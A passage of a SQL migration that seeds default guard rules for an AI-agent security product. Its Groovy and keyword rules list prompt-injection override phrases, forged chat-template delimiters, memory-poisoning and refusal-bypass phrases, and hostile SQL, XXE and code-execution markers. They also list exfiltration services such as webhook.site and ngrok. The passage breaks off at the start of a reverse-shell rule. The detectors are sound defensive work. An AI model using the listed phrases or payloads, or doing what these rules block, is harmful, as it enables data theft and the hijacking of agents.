    // 命中: 会话风险累积 ≥85 → deny；≥60 → challenge
    // 不命中(防误报): 单次低风险调用（风险分未达阈值）
    // 维护: virbius default rules 2026-10-22
    // 风险分由多维加权 + 时间衰减管理器累积，这里只做阈值映射
    def risk = ctx.sessionRiskScore()
    if (risk != null && risk >= 85) {
        ctx.setIntent("deny")
        return true
    }
    if (risk != null && risk >= 60) {
        ctx.setIntent("challenge")
        return true
    }
    return false
}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_session_risk_escalation' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_session_risk_escalation', 1, 'demo-default', 'cloud', 'groovy', 'CLOUD_SESSION_RISK_ESCALATION', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_session_risk_escalation');

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_destructive_command_deny', 1, 'system-builtin', 'cloud', 'groovy', 'DESTRUCTIVE_COMMAND', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_destructive_command_deny');

-- cloud_injection_marker_deny (Microsoft AGT examples/policies mining:
-- prompt-injection-safety.yaml / mcp-security.yaml / atr-community-rules.yaml),
-- scoped to role=tool_call like the sibling marker rules: invisible unicode in
-- executed args (zero-width/bidi/soft-hyphen), chat-template forging
-- delimiters, and the high-precision plain-override litany.
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_injection_marker_deny', 1, 'system-builtin', 'cloud', 'groovy',
    'INJECTION_MARKER', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_injection_marker_deny — 注入 marker（隐形字符 / 模板伪造 / 覆盖指令）
    // 命中: 执行参数含 U+200B 零宽字符 | <|im_start|>system | ignore previous instructions
    // 不命中(防误报): 正常多语言文本 | <|im_end|> 作为普通示例讲解（chat 角色不套用）
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面（执行参数里的隐写/伪造才具备攻击面）
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 族 1：隐形 Unicode（零宽 200B-F / BOM FEFF / 双向覆盖 202A-E / 隔离符 2066-9 /
    // 软连字符 00AD / 词连接符 2060）。206A-F 与 CJK 填充字符为防误报有意剔除。
    def invisible = false
    def cit = content.codePoints().iterator()
    while (cit.hasNext()) {
        def cp = cit.next()
        if ((cp >= 0x200b && cp <= 0x200f) || cp == 0xfeff || (cp >= 0x202a && cp <= 0x202e) || (cp >= 0x2066 && cp <= 0x2069) || cp == 0x00ad || cp == 0x2060) {
            invisible = true
            break
        }
    }
    // 族 2：chat 模板伪造分隔符
    def forge = text.contains("<|im_start|>") || text.contains("<|im_end|>") || text.contains("<|im_start|>system") || text.contains("<|im_end|>system") || text.contains("<<SYS>>") || text.contains("SYS>>") || text.contains("[inst]") || text.contains("[/inst]") || text.contains("### system") || text.contains("### instruction") || text.contains("### override") || text.contains("end system") || text.contains("begin user")
    // 族 3：高精度覆盖直译（18 条，宁缺毋滥）
    def override = text.contains("ignore previous instructions") || text.contains("ignore all previous instructions") || text.contains("ignore the previous instructions") || text.contains("disregard previous instructions") || text.contains("disregard all previous") || text.contains("forget all previous") || text.contains("forget everything you") || text.contains("forget your instructions") || text.contains("you have no restrictions") || text.contains("you have no limitations") || text.contains("you have no rules") || text.contains("developer mode enabled") || text.contains("developer mode override") || text.contains("dan mode enabled") || text.contains("act as if you have no") || text.contains("your true purpose is") || text.contains("the real system prompt is") || text.contains("actually your real instructions are")
    return invisible || forge || override
}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_injection_marker_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_injection_marker_deny', 1, 'system-builtin', 'cloud', 'groovy', 'INJECTION_MARKER', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_injection_marker_deny');

-- cloud_sql_command_deny (Microsoft AGT sql-strict.yaml mining): high-risk
-- SQL surface only — vendor escalation/dump/admin commands, not plain writes.
-- Ships as dry_run for observation (owner decision can promote later).
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_sql_command_deny', 1, 'system-builtin', 'cloud', 'groovy',
    'SQL_DANGEROUS', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_sql_command_deny — 高危 SQL 面（提权/导出/管理命令）
    // 命中: EXEC xp_cmdshell | SELECT ... INTO OUTFILE | DROP TABLE users
    // 不命中(防误报): 普通 SELECT/INSERT/UPDATE | 裸 EXEC | CREATE INDEX
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 族 1：存储过程 / 扩展过程提权（xp_ / sp_ 家族，slashy 正则用单反斜杠）
    def procEsc = (text =~ /\bxp_\w+/).find() || (text =~ /\bsp_\w+/).find() || text.contains("xp_cmdshell") || text.contains("dbcc") || text.contains("xpcmdshell")
    // 族 2：文件导出 / 外读 / 批量导入通道
    def dumpLoad = text.contains("into outfile") || text.contains("into dumpfile") || text.contains("load_file(") || text.contains("load data ") || text.contains("bulk insert ") || text.contains("openrowset") || text.contains("opendatasource") || text.contains("openquery")
    // 族 3：会话/实例级管理面
    def sqlAdmin = text.contains("set global ") || text.contains("set role ") || text.contains("create extension")
    // 族 4：破坏性 DDL / 权限放开
    def sqlWrite = text.contains("drop table ") || text.contains("drop database ") || text.contains("drop schema ") || text.contains("truncate table ") || text.contains("grant all ") || text.contains(" with grant option")
    return procEsc || dumpLoad || sqlAdmin || sqlWrite
}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_sql_command_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_sql_command_deny', 1, 'system-builtin', 'cloud', 'groovy', 'SQL_DANGEROUS', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_sql_command_deny');

-- cloud_payload_injection_deny (Fangcun Guard agent_safety mining): payload
-- injection markers only — XXE entities/external DTD, Mongo server-side-JS
-- operators ($where/$function/$accumulator), Python __import__ execution.
-- Deliberately excluded: full NoSQL operator set, import os/subprocess, bare
-- eval(/exec(, plain <!DOCTYPE html> without SYSTEM (benign on this surface).
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_payload_injection_deny', 1, 'system-builtin', 'cloud', 'groovy',
    'PAYLOAD_INJECTION', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_payload_injection_deny — 载荷注入 marker（XXE / Mongo 服务端 JS / Python 动态导入）
    // 命中: <!ENTITY xxe SYSTEM "file:///etc/passwd" | {$where: "..."} | __import__("os")
    // 不命中(防误报): 普通 <!DOCTYPE html> | Mongo $gt/$ne 查询 | import math
    // 维护: virbius default rules 2026-10-22
    // 仅 tool_call 平面
    def role = ctx.var("role")
    if (role != null && role != "tool_call") {
        return false
    }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") {
        return false
    }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) {
        return false
    }
    def text = content.toLowerCase()
    // 族 1：XXE（外部实体 / 外部 DTD，须带 SYSTEM）
    def xxe = text.contains("<!entity") || (text =~ /<!doctype\s+[\w-]+\s+system/).find()
    // 族 2：Mongo 服务端 JS 算子（等效 xp_cmdshell 层）
    def nosqlJs = (text =~ /\$(where|function|accumulator)\s*:/).find()
    // 族 3：Python 动态导入执行
    def pyDyn = text.contains("__import__(")
    return xxe || nosqlJs || pyDyn
}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_payload_injection_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_payload_injection_deny', 1, 'system-builtin', 'cloud', 'groovy', 'PAYLOAD_INJECTION', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_payload_injection_deny');

-- Default-rule cleanup: drop demo/redundant rules and promote the remaining
-- non-gateway dry_run rules to full. Gateway rules stay dry_run by owner decision.
DELETE FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id IN ('cloud_prompt_l1','cloud_rl_deny_keywords','cloud_rl_deny_vars','cloud_tool_chain_detect','edge_l0_content_allow');
DELETE FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id IN ('cloud_prompt_l1','cloud_rl_deny_keywords','cloud_rl_deny_vars','cloud_tool_chain_detect','edge_l0_content_allow');
UPDATE tb_rule_history SET rollout_state = 'full' WHERE tenant_id = 'default' AND rule_id IN ('cloud_encoded_exec_deny','cloud_destructive_command_deny','cloud_injection_marker_deny','cloud_sql_command_deny','cloud_payload_injection_deny','cloud_session_risk_escalation') AND rule_revision = (SELECT current_revision FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id);
UPDATE tb_rules_current SET rollout_state = 'full', updated_at = CURRENT_TIMESTAMP WHERE tenant_id = 'default' AND rule_id IN ('cloud_encoded_exec_deny','cloud_destructive_command_deny','cloud_injection_marker_deny','cloud_sql_command_deny','cloud_payload_injection_deny','cloud_session_risk_escalation');

-- Option A gateway cleanup: keep only the two rate rules and enforce them;
-- drop the demo subject/keyword rules.
DELETE FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id IN ('rl_deny_devices','rl_deny_keywords','rl_deny_users');
DELETE FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id IN ('rl_deny_devices','rl_deny_keywords','rl_deny_users');
UPDATE tb_rule_history SET rollout_state = 'full' WHERE tenant_id = 'default' AND rule_id IN ('rl_rate_user_1h','rl_rate_app_1h') AND rule_revision = (SELECT current_revision FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = tb_rule_history.rule_id);
UPDATE tb_rules_current SET rollout_state = 'full', updated_at = CURRENT_TIMESTAMP WHERE tenant_id = 'default' AND rule_id IN ('rl_rate_user_1h','rl_rate_app_1h');

-- ============================================================
-- V34: Agent-risk default rules (VE evaluation gap fill, 2026-10-24)
-- Layers: cloud / edge / gateway / falco. Rule data only.
-- ============================================================

INSERT INTO tb_cumulative (
    tenant_id, cumulative_name, description, dimension, window_kind, window_minutes, window_hours,
    timezone, priority, status)
SELECT 'default', 'tool_req_1m', 'Per-tool rolling 1-minute limit', 'var:tool_name', 'rolling', 1, NULL,
    NULL, 12, 'active' FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_cumulative WHERE tenant_id = 'default' AND cumulative_name = 'tool_req_1m');

-- cloud_dynamic_code_exec_deny (cloud/groovy)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_dynamic_code_exec_deny', 1, 'system-builtin', 'cloud', 'groovy',
    'DYNAMIC_CODE_EXEC', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_dynamic_code_exec_deny — 动态代码执行引信（eval/exec/子进程）
    // 命中: python -c "eval(user_input)" | node -e "new Function(x)" | child_process.exec(cmd)
    // 不命中(防误报): 文档提到 eval() | 普通 evaluate/executive 单词 | chat 内容
    // 维护: virbius default rules 2026-10-24
    def role = ctx.var("role")
    if (role != null && role != "tool_call") { return false }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") { return false }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) { return false }
    def tn = tool.toLowerCase()
    // 仅代码执行类工具，避免把普通工具参数里的 eval/exec 字样误判
    def execTool = ["execute_code", "run_code", "code_interpreter", "python", "python3",
        "node", "bash", "shell", "subprocess", "run_command", "exec_command", "eval"].any { tn.contains(it) }
    if (!execTool) { return false }
    def text = content.toLowerCase()
    def dyn = text.contains("eval(") || text.contains("exec(") || text.contains("new function(")
    def proc = text.contains("child_process.") || text.contains("subprocess.")
        || text.contains("os.system(") || text.contains("runtime.getruntime().exec(")
    if (dyn || proc) { ctx.setIntent("deny"); return true }
    return false
}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_dynamic_code_exec_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_dynamic_code_exec_deny', 1, 'system-builtin', 'cloud', 'groovy', 'DYNAMIC_CODE_EXEC', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_dynamic_code_exec_deny');

-- cloud_suspicious_egress_deny (cloud/groovy)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_suspicious_egress_deny', 1, 'system-builtin', 'cloud', 'groovy',
    'SUSPICIOUS_EGRESS', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_suspicious_egress_deny — 已知外渗/回连通道域名拦截
    // 命中: POST https://webhook.site/... | curl https://requestbin.net/... | ngrok 隧道
    // 不命中(防误报): 文档/README 出现域名（chat_input）| 普通业务域名
    // 维护: virbius default rules 2026-10-24
    def role = ctx.var("role")
    if (role != null && role != "tool_call") { return false }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") { return false }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) { return false }
    def text = content.toLowerCase()
    // 仅收录一次性接收/隧道/粘贴类服务（业务域名不在此列）
    def domains = ["webhook.site", "requestbin.net", "requestbin.io", "pipedream.net",
        "interact.sh", "beeceptor.com", "transfer.sh", "pastebin.com", "paste.ee",
        "ngrok.io", "ngrok-free.app", "burpcollaborator.net", "oast.fun", "dnslog.cn"]
    if (domains.any { text.contains(it) }) { ctx.setIntent("deny"); return true }
    return false
}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_suspicious_egress_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_suspicious_egress_deny', 1, 'system-builtin', 'cloud', 'groovy', 'SUSPICIOUS_EGRESS', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_suspicious_egress_deny');

-- cloud_high_risk_tool_challenge (cloud/groovy)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_high_risk_tool_challenge', 1, 'system-builtin', 'cloud', 'groovy',
    'HIGH_RISK_TOOL', 60, 'challenge', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_high_risk_tool_challenge — 高危工具名/动作二次确认
    // 命中: transfer_funds | delete_mailbox | send_email | deploy_app | reset_password
    // 不命中(防误报): get_/list_/search_/read_ 等只读工具 | chat 内容
    // 维护: virbius default rules 2026-10-24
    def role = ctx.var("role")
    if (role != null && role != "tool_call") { return false }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") { return false }
    def tn = tool.toLowerCase()
    // 付款/删除/发布/部署/账号/执行类动作（只读工具不在列表内）
    def markers = ["transfer_", "payment", "payout", "withdraw_", "delete_", "drop_",
        "destroy_", "revoke_", "grant_", "reset_password", "create_user", "update_user",
        "send_email", "send_message", "publish_", "deploy_", "execute_", "run_shell",
        "exec_command", "terraform_apply", "k8s_", "ssh_"]
    if (markers.any { tn.contains(it) }) { ctx.setIntent("challenge"); return true }
    return false
}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_high_risk_tool_challenge' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_high_risk_tool_challenge', 1, 'system-builtin', 'cloud', 'groovy', 'HIGH_RISK_TOOL', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_high_risk_tool_challenge');

-- cloud_memory_poison_deny (cloud/groovy)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'cloud_memory_poison_deny', 1, 'system-builtin', 'cloud', 'groovy',
    'MEMORY_POISON', 80, 'deny', '{"bind_scope":"global"}',
    'def decide(ctx) {
    // cloud_memory_poison_deny — 记忆写入 + 指令覆盖/隐藏指令
    // 命中: memory_save("ignore previous instructions ...") | remember("you are now ...")
    // 不命中(防误报): 普通偏好/事实记忆 | chat 内容
    // 维护: virbius default rules 2026-10-24
    def role = ctx.var("role")
    if (role != null && role != "tool_call") { return false }
    def tool = ctx.var("tool_name")
    if (tool == null || tool.isBlank() || tool == "chat_input") { return false }
    def tn = tool.toLowerCase()
    // 仅记忆写入面：普通 notes 工具不命中
    def memTool = tn.contains("memory") || tn.contains("remember") || tn.contains("memorize")
        || tn.contains("write_note") || tn.contains("save_note")
    if (!memTool) { return false }
    def content = ctx.var("content")
    if (content == null || content.isBlank()) { return false }
    def text = content.toLowerCase()
    // 需要同时出现指令覆盖/隐藏指令，普通记忆内容不命中
    def markers = ["ignore previous", "ignore all previous", "disregard", "system prompt",
        "hidden instruction", "do not reveal", "don''t tell", "you are now", "new instructions",
        "override all", "from now on you", "always obey"]
    if (markers.any { text.contains(it) }) { ctx.setIntent("deny"); return true }
    return false
}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'cloud_memory_poison_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'cloud_memory_poison_deny', 1, 'system-builtin', 'cloud', 'groovy', 'MEMORY_POISON', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'cloud_memory_poison_deny');

-- edge_dlp_email (edge/dlp-dsl)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'edge_dlp_email', 1, 'system-builtin', 'edge', 'dlp-dsl',
    'DLP_EMAIL', 0, 'allow', '{}',
    '{"entity_type":"email","priority":20,"mask_template":"{{VIRBIUS_EMAIL_{seq}}}"}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_email' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'edge_dlp_email', 1, 'system-builtin', 'edge', 'dlp-dsl', 'DLP_EMAIL', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_email');

-- edge_dlp_idcard (edge/dlp-dsl)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'edge_dlp_idcard', 1, 'system-builtin', 'edge', 'dlp-dsl',
    'DLP_IDCARD', 0, 'allow', '{}',
    '{"entity_type":"idcard_cn","priority":20,"mask_template":"{{VIRBIUS_IDCARD_CN_{seq}}}"}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_idcard' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'edge_dlp_idcard', 1, 'system-builtin', 'edge', 'dlp-dsl', 'DLP_IDCARD', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_idcard');

-- edge_dlp_bank_card (edge/dlp-dsl)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'edge_dlp_bank_card', 1, 'system-builtin', 'edge', 'dlp-dsl',
    'DLP_BANK_CARD', 0, 'allow', '{}',
    '{"entity_type":"bank_card_cn","priority":20,"mask_template":"{{VIRBIUS_BANK_CARD_CN_{seq}}}"}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_bank_card' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'edge_dlp_bank_card', 1, 'system-builtin', 'edge', 'dlp-dsl', 'DLP_BANK_CARD', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_bank_card');

-- edge_dlp_secret_token (edge/dlp-dsl)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'edge_dlp_secret_token', 1, 'system-builtin', 'edge', 'dlp-dsl',
    'DLP_SECRET_TOKEN', 0, 'allow', '{}',
    '{"entity_type":"custom_regex","pattern":"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-[A-Za-z0-9_-]{20,}|gh[pousr]_[A-Za-z0-9]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|eyJ[A-Za-z0-9_-]{10,}[.][A-Za-z0-9_-]{10,}[.][A-Za-z0-9_-]{10,})","priority":10,"mask_template":"{{VIRBIUS_SECRET_{seq}}}"}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_secret_token' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'edge_dlp_secret_token', 1, 'system-builtin', 'edge', 'dlp-dsl', 'DLP_SECRET_TOKEN', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'edge_dlp_secret_token');

-- edge_l0_refusal_bypass_deny (edge/lua-dsl)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'edge_l0_refusal_bypass_deny', 1, 'system-builtin', 'edge', 'lua-dsl',
    'EDGE_REFUSAL_BYPASS_DENY', 80, 'deny', '{}',
    '{"keywords":["do not refuse","never refuse","don''t refuse","bypass your safety","ignore your safety","without restrictions","no restrictions","unrestricted mode","must comply","answer regardless","override your instructions"],"list_type":"deny"}',
    'dry_run', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'edge_l0_refusal_bypass_deny' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'edge_l0_refusal_bypass_deny', 1, 'system-builtin', 'edge', 'lua-dsl', 'EDGE_REFUSAL_BYPASS_DENY', 'dry_run', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'edge_l0_refusal_bypass_deny');

-- gw_rate_tool_1m (gateway/lua)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'gw_rate_tool_1m', 1, 'system-builtin', 'gateway', 'lua',
    'GW_TOOL_RATE_1M', 70, 'challenge', '{"bind_scope":"global"}',
    '-- virbius:generated v1
function decide(ctx)
  return getCumulative(''tool_req_1m'') >= 60
end',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'gw_rate_tool_1m' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'gw_rate_tool_1m', 1, 'system-builtin', 'gateway', 'lua', 'GW_TOOL_RATE_1M', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'gw_rate_tool_1m');

-- builtin_reverse_shell (falco/falco)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'builtin_reverse_shell', 1, 'system-builtin', 'falco', 'falco',
